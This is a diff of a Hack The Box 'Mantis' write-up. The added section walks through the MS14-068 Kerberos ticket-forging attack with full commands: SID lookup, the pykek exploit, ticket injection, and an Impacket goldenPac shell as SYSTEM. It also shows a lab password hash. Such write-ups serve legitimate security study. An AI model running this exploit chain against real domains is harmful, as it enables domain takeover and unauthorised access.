@@ -127,9 +127,9 @@ On this web page, it displays the default IIS index page. So lets look for hidde
 gobuster -u http://10.10.10.52:1337 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-It finds the path _/secure_notes_ on which we see two files:
+It finds the path _/secure_notes_ on which there are two files:
 - web.config
-  - Returns the HTTP code _404 Not Found_
+  - Returns HTTP code _404 Not Found_
 
 - dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
   - With this content:
@@ -150,8 +150,8 @@ echo -n NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
 6d2424716c5f53405f504073735730726421
 ```
 
-As this string is 36 characters long and there is not a popular hash type with this length, this string has to be something else.
-The characters are mostly numbers and the letters _c, d, f_ so we assume this could be a hexadecimal value:
+As this string is 36 characters long and there is not a known hash type with this length, this string has to be something else.
+The characters are mostly numbers and the letters _c, d, f_ so assuming this could be a hexadecimal value:
 ```markdown
 echo -n 6d2424716c5f53405f504073735730726421 | xxd -ps -r
 
@@ -179,3 +179,100 @@ When searching for _"User"_ it finds a user database with usernames and password
   - Password: AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==
   - Salt: UBwWF1CQCsaGc/P7jIR/kg==
   - HashAlgorithm: PBKDF2
+
+Lets use the clear-text credentials to authenticate to the server.
+
+## Kerberos Forging Attack
+
+The vulnerability to exploit is described in the [Microsoft Security Bulletin MS14-068](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-068).
+
+There are some requirements to do before going on.
+- Install the following packages:
+```markdown
+apt install krb5-user cifs-utils rdate
+```
+
+- Edit the _/etc/hosts_ file:
+```markdown
+10.10.10.52   mantis mantis.htb htb.local mantis.htb.local
+```
+
+- Edit the _/etc/resolv.conf_ file:
+```markdown
+nameserver    10.10.10.52
+```
+
+- Edit the _/etc/krb5.conf_ file:
+```markdown
+[libdefaults]
+    default_realm = HTB.LOCAL
+
+[realms]
+    LAB.LOCAL = {
+        kdc = mantis.htb.local:88
+        admin_server = mantis.htb.local
+        default_domain = HTB.LOCAL
+    }
+
+[domain_realm]
+    .domain.internal = HTB.LOCAL
+    domain.internal = HTB.LOCAL
+```
+
+- Configure the date:
+```markdown
+rdate -n mantis.htb.local
+```
+
+- Generate Kerberos Ticket for domain user:
+```markdown
+kinit james
+
+# List tickets
+klist
+
+# Output
+Valid starting       Expires              Service principal
+02/09/2020 18:23:59  02/10/2020 04:23:59  krbtgt/HTB.LOCAL@HTB.LOCAL
+        renew until 02/10/2020 18:23:53
+```
+
+We are authenticated to the domain but when trying to connect to the server via **SMB**, it will still deny access because the user has not the proper authority to access the content:
+```markdown
+smbclient -W HTB.LOCAL //MANTIS/c$ -k
+
+# Output
+tree connect failed: NT_STATUS_ACCESS_DENIED
+```
+
+- Get the unique identifier for the user:
+```markdown
+rpcclient -U james MANTIS
+
+rpcclient $> lookupnames james
+james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)
+```
+
+Now we run the [MS14-068 exploit script](https://github.com/mubix/pykek):
+```markdown
+python ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d MANTIS
+```
+
+The `klist` command shows now another ticket that we possess and the script created the file _TGT_james@HTB.LOCAL.ccache_ that has to be moved to the directory _/tmp/krb5cc_0_.
+```markdown
+mv TGT_james@HTB.LOCAL.ccache /tmp/krb5cc_0
+```
+
+It is possible to connect to the domain via **SMB** and we got the permission to view all files.
+```markdown
+smbclient -W HTB.LOCAL //MANTIS/c$ -k
+```
+
+### Starting a shell
+
+Lets start a shell on the box with the script **goldenPac** from the **Impacket Framework**:
+```markdown
+python3 /usr/share/doc/python3-impacket/examples/goldenPac.py HTB.LOCAL/james@mantis
+```
+
+We are logged in as _NT Authority\SYSTEM_ on the box!
